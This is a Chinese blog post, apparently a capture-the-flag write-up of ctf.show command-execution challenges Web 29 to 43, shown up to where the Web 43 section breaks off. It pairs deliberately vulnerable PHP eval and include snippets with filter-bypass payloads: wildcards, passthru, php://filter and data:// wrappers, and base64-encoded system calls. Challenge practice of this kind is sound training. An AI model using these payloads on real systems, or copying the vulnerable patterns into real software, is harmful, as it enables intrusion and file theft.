<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>ctf-show-命令执行 | 忆 执 昔 来 的 旅 途</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="CTF" />
  
  
  
  
  <meta name="description" content="一、CTF Show — 命令执行1.1 Web 29 — 只过滤 flag — 通配符使用1命令执行，需要严格的过滤  12345678910&lt;?php    error_reporting(0);	if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    $c &#x3D; $_GET[&amp;#x27;c&amp;#x27;];    if(!preg_match(&quot;&#x2F;fla">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-Show-命令执行">
<meta property="og:url" content="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
<meta property="og:description" content="一、CTF Show — 命令执行1.1 Web 29 — 只过滤 flag — 通配符使用1命令执行，需要严格的过滤  12345678910&lt;?php    error_reporting(0);	if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    $c &#x3D; $_GET[&amp;#x27;c&amp;#x27;];    if(!preg_match(&quot;&#x2F;fla">
<meta property="og:locale">
<meta property="og:image" content="https://i.loli.net/2021/07/15/eCRNiO2MgT5jc3z.png">
<meta property="og:image" content="https://i.loli.net/2021/07/15/WMCiphNGKJaA8RP.png">
<meta property="og:image" content="https://i.loli.net/2021/07/16/wqpIKykj8S1uYvL.png">
<meta property="og:image" content="https://i.loli.net/2021/07/30/xgpZKh3ToGdwrN1.png">
<meta property="og:image" content="https://i.loli.net/2021/07/30/fR3iKbqkhmP8gXp.png">
<meta property="og:image" content="https://i.loli.net/2021/07/30/PK3vJ9uVDpkQTAE.png">
<meta property="og:image" content="https://i.loli.net/2021/07/30/xog4phV91mJNY6G.png">
<meta property="og:image" content="https://i.loli.net/2021/08/01/gEVwLJ1UaseCyzm.png">
<meta property="og:image" content="https://i.loli.net/2021/08/01/D5NkR79Zq4dQMiO.png">
<meta property="og:image" content="https://i.loli.net/2021/08/01/S1Xw8eTFWKQdlgm.png">
<meta property="og:image" content="https://i.loli.net/2021/08/10/Y6bwlONZ3xSaEuy.png">
<meta property="og:image" content="https://i.loli.net/2021/08/10/wl4qGscBUVZoTKp.png">
<meta property="og:image" content="https://i.loli.net/2021/08/10/oEVxN76kPBbT8hS.png">
<meta property="article:published_time" content="2021-10-01T11:14:09.000Z">
<meta property="article:modified_time" content="2021-10-01T11:14:51.490Z">
<meta property="article:author" content="xizhi-future">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/07/15/eCRNiO2MgT5jc3z.png">
  
    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
}

  </style>
  
<link rel="stylesheet" href="/css/style.css">


  
<script src="/js/jquery-3.1.1.min.js"></script>

  
<script src="/js/bootstrap.js"></script>


  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    
<link rel="stylesheet" href="/css/dialog.css">

  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

<meta name="generator" content="Hexo 5.4.0"></head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
                
                  <li> <a class="main-nav-link" href="/friendly-links">友情链接</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-CTF-Show-命令执行" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      CTF-Show-命令执行
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
	  <time datetime="2021-10-01T11:14:09.000Z" itemprop="datePublished">2021-10-01</time>
	</a>

      
    <a class="article-category-link" href="/categories/CTF-Show/">CTF Show</a>

      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="一、CTF-Show-—-命令执行"><a href="#一、CTF-Show-—-命令执行" class="headerlink" title="一、CTF Show — 命令执行"></a>一、CTF Show — 命令执行</h1><h2 id="1-1-Web-29-—-只过滤-flag-—-通配符使用"><a href="#1-1-Web-29-—-只过滤-flag-—-通配符使用" class="headerlink" title="1.1 Web 29 — 只过滤 flag — 通配符使用"></a>1.1 Web 29 — 只过滤 flag — 通配符使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令执行，需要严格的过滤</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?c=phpinfo();</span><br><span class="line">?c=system(<span class="string">&#x27;ls&#x27;</span>);		<span class="comment">#flag.php index.php </span></span><br><span class="line">?c=system(<span class="string">&#x27;tac fl?g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-2-Web-30-—-过滤-system-—-其它函数使用"><a href="#1-2-Web-30-—-过滤-system-—-其它函数使用" class="headerlink" title="1.2 Web 30 — 过滤 system() — 其它函数使用"></a>1.2 Web 30 — 过滤 system() — 其它函数使用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&#x27;ls&#x27;</span>);		<span class="comment">#flag.php index.php </span></span><br><span class="line">?c=passthru(<span class="string">&#x27;tac fl?g.?hp&#x27;</span>);</span><br><span class="line">或者</span><br><span class="line">?c=passthru(<span class="string">&#x27;cat fl?g.?hp&#x27;</span>); <span class="comment">#之后查看源代码</span></span><br></pre></td></tr></table></figure>

<h2 id="1-3-Web-31-—-过滤部分-读取-命令"><a href="#1-3-Web-31-—-过滤部分-读取-命令" class="headerlink" title="1.3 Web 31 — 过滤部分 读取 命令"></a>1.3 Web 31 — 过滤部分 读取 命令</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&quot;ls&quot;</span>);		<span class="comment">#flag.php index.php </span></span><br><span class="line">?c=passthru(<span class="string">&quot;more%09f*&quot;</span>);</span><br><span class="line">?c=passthru(<span class="string">&quot;tac%09f*&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-4-Web-32-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-4-Web-32-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.4 Web 32 — 过滤 ; — PHP include、伪协议 利用"></a>1.4 Web 32 — 过滤 ; — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"> error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/eCRNiO2MgT5jc3z.png" alt="image-20210715163024052"></p>
<h2 id="1-5-Web-33-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-5-Web-33-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.5 Web 33 — 过滤 ; — PHP include、伪协议 利用"></a>1.5 Web 33 — 过滤 ; — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/WMCiphNGKJaA8RP.png" alt="image-20210715165721641"></p>
<h2 id="1-6-Web-34-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-6-Web-34-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.6 Web 34 — 过滤 : — PHP include、伪协议 利用"></a>1.6 Web 34 — 过滤 : — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-7-Web-35-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-7-Web-35-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.7 Web 35 — 过滤 = — PHP include、伪协议 利用"></a>1.7 Web 35 — 过滤 = — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-8-Web-36-—-过滤-数字-0-9-、-—-PHP-include、伪协议-利用"><a href="#1-8-Web-36-—-过滤-数字-0-9-、-—-PHP-include、伪协议-利用" class="headerlink" title="1.8 Web 36 — 过滤 数字 [0-9]、/ — PHP include、伪协议 利用"></a>1.8 Web 36 — 过滤 数字 [0-9]、/ — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-9-Web-37-—-include-—-文件包含、伪协议利用"><a href="#1-9-Web-37-—-include-—-文件包含、伪协议利用" class="headerlink" title="1.9 Web 37 — include — 文件包含、伪协议利用"></a>1.9 Web 37 — include — 文件包含、伪协议利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;       &#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;cat f*&#x27;); #查看源代码</span></span><br></pre></td></tr></table></figure>

<h2 id="1-10-Web-38-—-过滤-php—-文件包含、伪协议data-base64编码利用"><a href="#1-10-Web-38-—-过滤-php—-文件包含、伪协议data-base64编码利用" class="headerlink" title="1.10 Web 38 — 过滤 php— 文件包含、伪协议data base64编码利用"></a>1.10 Web 38 — 过滤 php— 文件包含、伪协议data base64编码利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;        include($c);        echo $flag;    &#125;       &#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAKc3lzdGVtKCd0YWMgZionKTs=#PD9waHAKc3lzdGVtKCd0YWMgZionKTs=解码是<span class="meta">&lt;?php</span>system(&#x27;tac f*&#x27;);</span></span><br></pre></td></tr></table></figure>

<h2 id="1-11-Web-39-—-php-后缀截断-—-gt-标签-注释符-绕过"><a href="#1-11-Web-39-—-php-后缀截断-—-gt-标签-注释符-绕过" class="headerlink" title="1.11 Web 39 — .php 后缀截断 — ?&gt;标签   //注释符 绕过"></a>1.11 Web 39 — .php 后缀截断 — ?&gt;标签   //注释符 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);//		#flag.php index.php ?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;tac f*&#x27;);//或者是?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span>		#flag.php index.php .php?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;tac f*&#x27;);<span class="meta">?&gt;</span>    </span></span><br></pre></td></tr></table></figure>

<h2 id="1-12-Web-40-—-无参函数构造（套娃）"><a href="#1-12-Web-40-—-无参函数构造（套娃）" class="headerlink" title="1.12 Web 40 — 无参函数构造（套娃）"></a>1.12 Web 40 — 无参函数构造（套娃）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;        &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(current(localeconv())));	<span class="comment">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) ?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));#读取数组倒数第二个元素，并使用高亮显示出来</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/16/wqpIKykj8S1uYvL.png" alt="image-20210716160101867"></p>
<h2 id="1-13-Web-41-—"><a href="#1-13-Web-41-—" class="headerlink" title="1.13 Web 41 —"></a>1.13 Web 41 —</h2><p><strong>过滤不严，命令执行</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://wp.ctf.show/d/137-ctfshow-web-web41">https://wp.ctf.show/d/137-ctfshow-web-web41</a></p>
<h2 id="1-14-Web-42-—-system-gt-dev-null-2-gt-amp-1-—-0a-绕过"><a href="#1-14-Web-42-—-system-gt-dev-null-2-gt-amp-1-—-0a-绕过" class="headerlink" title="1.14 Web 42 — system  &gt;/dev/null 2&gt;&amp;1 — %0a 绕过"></a>1.14 Web 42 — system  &gt;/dev/null 2&gt;&amp;1 — %0a 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%<span class="number">0</span>a		<span class="comment">#flag.php index.php ?c=tac flag.php%0a</span></span><br></pre></td></tr></table></figure>

<h2 id="1-15-Web-43-—-system-gt-dev-null-2-gt-amp-1-—-26-绕过"><a href="#1-15-Web-43-—-system-gt-dev-null-2-gt-amp-1-—-26-绕过" class="headerlink" title="1.15 Web 43 — system  &gt;/dev/null 2&gt;&amp;1 — %26 绕过"></a>1.15 Web 43 — system  &gt;/dev/null 2&gt;&amp;1 — %26 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br></pre></td></tr></table></figure>

